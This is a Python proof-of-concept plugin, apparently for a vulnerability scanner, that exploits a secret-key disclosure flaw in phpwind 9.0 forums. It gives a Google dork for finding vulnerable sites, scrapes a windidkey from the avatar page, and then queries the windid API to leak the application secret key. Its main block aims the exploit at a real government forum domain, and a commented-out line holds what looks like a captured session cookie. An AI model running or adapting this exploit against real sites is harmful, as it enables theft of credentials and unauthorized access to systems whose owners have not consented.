#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
author: yichin
name: phpwind 9.0 api key disclosure (login required)
google dork: intext: powered by phpwind v9.0
create-date: 2015-06-29
refer: http://beebeeto.com/pdb/poc-2014-0204/
refer: http://www.wooyun.org/bugs/wooyun-2010-072727
'''

import re

def assign(service, arg):
    if service == "phpwind":
        return True, arg

def audit(arg):
    windKeyUrl = arg + 'index.php?m=profile&c=avatar&_left=avatar'

    #for test
    #cookie = "ZC4__lastvisit=40%091435585267%09%2Findex.php%3Fm%3Dprofile%26c%3Davatar%26_left%3Davatar; ZC4__visitor=VsjU%2BCZ9SIINfqzdFRyVv6G13crUQelYJppi4NVPhVDGHMdk8h1jaPW%2FWMY%3D; csrf_token=2a68b5ce7c6a0716; _ac_app_ua=4cb71b67a1a0d5ef43; CNZZDATA1000306838=1490277786-1435582166-%7C1435582166; ZC4__winduser=9yP94FR0vdsrdjZweHvCi9QwpVFx9DxPJ7%2FysLx%2B4A6664hK6nzJp%2FTeDJs%3D"
    #curlArg = '-b "' + cookie +'" ' + windKeyUrl

    curlArg = windKeyUrl
    #get windkey
    code, head, res, errcode, _ = curl.curl(curlArg)
    if code == 200:
        windKeyMatch = 'uid%3D([\d]+)%26windidkey%3D([0-9a-fA-F]{32})%26time%3D([\d]+)%26'
        m = re.search(windKeyMatch, res)
        if m:
            #get secret key
            uid = m.group(1)
            windkey =  m.group(2)
            _time = m.group(3)
            secretKeyUrl = '%swindid/index.php?m=api&c=app&a=list&uid=%s&windidkey=%s&time=%s&clientid=1&type=flash' % (arg, uid, windkey, _time)
            code, head, res, errcode, _ = curl.curl('-d "uid=undefined" '+secretKeyUrl)
            if code == 200 and 'secretkey' in res:
                security_hole('secretkey disclosure: ' + secretKeyUrl + ' --data "uid=undifined"')
            else:
                return False
        else:
            return False
    else:
        return False

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpwind', 'http://bbs.typhoon.gov.cn/')[1])
